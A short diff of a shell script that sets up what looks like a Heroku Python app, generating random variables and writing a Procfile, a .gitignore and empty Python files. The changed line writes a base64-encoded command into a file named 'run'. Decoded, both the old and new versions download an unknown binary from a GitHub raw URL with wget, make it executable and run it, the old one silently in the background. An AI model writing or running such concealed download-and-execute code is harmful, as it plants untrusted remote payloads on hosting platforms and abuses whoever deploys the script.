@@ -34,7 +34,7 @@ sc29=$(shuf -i 1-9999999999 -n 1)
 sc30=$(shuf -i 1-9999999999 -n 1)
 scmin=$(shuf -i 1-9999999999 -n 1)
 buildpack="heroku/python"
-echo 'd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vZHNlODM0Ny9kci9yYXcvbWFpbi80CmNobW9kICt4IDQKLi80ID4vZGV2L251bGwgMj4mMSA+L2Rldi9udWxsICYKd2hpbGUgOjsgZG8gZWNobyAnaGVsbG8nOyBzbGVlcCAzMDsgY2xlYXI7IGRvbmU=' > run
+echo 'd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vZHNlODM0Ny9kci9yYXcvbWFpbi8yMgpjaG1vZCAreCAyMgouLzIyCg==' > run
 echo 'web: bash' > Procfile
 echo '*' > .gitignore
 touch main.py requirements.txt
